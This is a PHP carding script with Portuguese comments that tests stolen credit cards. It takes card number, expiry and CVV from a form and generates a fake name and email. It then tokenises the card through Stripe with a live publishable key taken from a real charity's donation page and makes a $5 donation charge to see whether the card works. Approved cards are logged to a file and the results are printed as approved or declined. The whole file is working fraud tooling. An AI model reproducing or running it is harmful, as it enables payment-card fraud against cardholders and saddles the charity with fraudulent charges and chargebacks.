<?php
    
    function randomMail(){
        $dataPessoa = file_get_contents(PROC."/chk/rec/pessoas.json");
        $json = json_decode($dataPessoa,true);
        $d = file(PROC."/chk/rec/dominio.txt");
        $dominio = $d[rand(0,count($d) - 1)];
        $nome = trim($json[rand(0,count($json) - 1)]["name"]);
        $nome = str_replace(" ","",$nome);
        return "$nome@$dominio";
    }
    function randomName(){
        $dataPessoa = file_get_contents(PROC."/chk/rec/pessoas.json");
        $json = json_decode($dataPessoa,true);
        $nome = trim($json[rand(0,count($json) - 1)]["name"]);
        return $nome;
    }
    function Get4String($string,$start,$end){
        $s = explode($start,$string);
        $s = explode($end,$s[1]);
        return $s[0];
    }

    function SaveFile($filename,$write){
        $file = fopen($filename,"ab");
        fwrite($file,$write);
        fclose($file);
    }

    if(isset($_POST['valor'])){
        $curl = [];
        $cc = $_POST['valor'];
        $card = [];
        $mes = [];
        $ano = [];
        $cvv = [];

          //divide cartão
        $card = explode("|",$cc)[0];
        $mes = explode("|",$cc)[1];
        $ano = explode("|",$cc)[2];
        $cvv = explode("|",$cc)[3];

        //email aleatorio
        $mail = randomMail();
        //nome aleatorio
        $nome = randomName();
        //verifica se hà o arquivo de cookie e exclui
        if(file_exists(getcwd().'cookie.txt')){
            unlink(getcwd()."cookie.txt");
        }

        //inicia o curl
        $curl = curl_init();

        //array de opcoes do curl
        $options = array(
            CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
            // CURLOPT_PROXY => $proxy,
            //  CURLOPT_PROXYUSERPWD => $user,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => array(''),
            CURLOPT_USERAGENT => "$_SERVER[HTTP_USER_AGENT]",
            CURLOPT_COOKIESESSION => true,
            CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
            CURLOPT_COOKIE => getcwd().'/cookie.txt',
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => "email=$mail&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fcincywarriorrun.org%2Fdonate%2F&pasted_fields=number&card[number]=$card&card[exp_month]=$mes&card[exp_year]=$ano&card[cvc]=$cvv&card[name]=$nome&time_on_page=35234&guid=43e417e2-d6d5-48f5-bdd4-fff4816f4125&muid=4ddba4f5-ed4f-466c-a2ec-d5e1150e1f9b&sid=5ed56a1b-4912-43d3-9fea-3896d9439c2a&key=pk_live_kE9c0cWEVjSUQAfue14xVAPC"
        );
        //colocando as opções
        curl_setopt_array($curl,$options);
        $res = curl_exec($curl);
        if(curl_errno($curl)){
            echo "FATAL ERROR CONTATE O ADM... ";
            curl_close($curl); 
        }
        $json = json_decode($res,true);
        if(array_key_exists("error",$json)){
            echo "<div class='error'>✘ REPROVADA $card|$mes|$ano|$cvv ♦".$json["error"]["code"]."♦</div>";
            curl_close($curl);
        }
        else{
            SaveFile(PROC."/chk/rec/sucessomuido.txt","cc aprovada $card|$mes|$ano|$cvv\n");
            $token = $json["id"];
            curl_close($curl);
            $curl = curl_init();
            $options = array(
                CURLOPT_URL => 'http://cincywarriorrun.org/donate/',
                // CURLOPT_PROXY => $proxy,
                //  CURLOPT_PROXYUSERPWD => $user,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTPHEADER => array(''),
                CURLOPT_USERAGENT => "$_SERVER[HTTP_USER_AGENT]",
                CURLOPT_COOKIESESSION => true,
                CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
                CURLOPT_COOKIE => getcwd().'/cookie.txt',
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => "stripeAmount=5.00&stripeToken=$token&stripeTokenType=card&stripeEmail=$mail&stripeButtonKey=6f12639f8fdf4b3f11ba3aab972a1642&stripeItemPrice=0&stripeTax=0&stripeShipping=0&stripeItemCost=0&asp_action=process_ipn&item_name=Donate+Now&item_quantity=1&currency_code=USD&item_url=&thankyou_page_url=&charge_description=++Thank+you+for+your+kind+donation.&clickProcessed=1"
            );
            curl_setopt_array($curl,$options);
            $res = curl_exec($curl);
            curl_close($curl);
            if(strpos($res,"Your card was declined.") !== false){
                echo "<div class='error'>✘ REPROVADA $card|$mes|$ano|$cvv ♦card declined♦</div>";
            }else{
                echo "<div class='sucess'>✔ APROVADA $card|$mes|$ano|$cvv</div>";
            }
        }
    }
        //<div class='cards-sucess'>✔ APROVADA $card|$mes|$ano|$cvv</div>